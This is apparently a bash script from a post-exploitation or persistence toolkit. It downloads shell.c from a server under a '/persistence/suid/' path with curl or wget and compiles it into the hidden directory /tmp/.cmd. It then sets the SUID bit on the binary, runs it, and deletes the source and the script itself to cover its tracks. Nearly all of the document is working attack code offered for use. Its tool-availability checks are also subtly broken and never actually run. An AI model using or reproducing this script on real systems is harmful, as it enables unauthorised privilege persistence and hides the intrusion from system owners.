#!/bin/bash

FALSE=$(/bin/false)
SERVER_URL="http://localhost:11000"
HAS_GCC="which gcc"
HAS_CURL="which curl"
HAS_WGET="which wget"
if [[ "$WORKDIR" == "$FALSE" ]];
then
	WORKDIR="/tmp/.cmd"
fi

createWorkingDirectory () {
	mkdir -p "${WORKDIR}"
}

downloadWithCurl () {
	output_filename="shell.c"
	compiled_output_path="${WORKDIR}/$(basename -s .c ${output_filename})"
	curl --silent "${SERVER_URL}/persistence/suid/shell.c" -o "${output_filename}"
	gcc "${output_filename}" -o "$compiled_output_path"
	rm "${output_filename}" "${0}"
	chmod u+s "${compiled_output_path}"
	"${compiled_output_path}"
	exit
}

downloadWithWget () {
	output_filename="shell.c"
	compiled_output_path="${WORKDIR}/$(basename -s .c ${output_filename})"
	wget --quiet "${SERVER_URL}/persistence/suid/shell.c" -O "${output_filename}"
	gcc "${output_filename}" -o "${compiled_output_path}"
	rm "${output_filename}" "${0}"
	chmod u+s "${compiled_output_path}"
	"${compiled_output_path}"
	exit
}

run () {
	createWorkingDirectory

	cd "${WORKDIR}"

	if [[ "$HAS_GCC" != "$FALSE" ]];
	then
		if [[ "$HAS_CURL" != "$FALSE" ]];
		then
			# echo "CURL is available!"
			downloadWithCurl
		fi

		if [[ "$HAS_WGET" != "$FALSE" ]];
		then
			# echo "WGET is available!"
			downloadWithWget
		fi
	fi
}

run
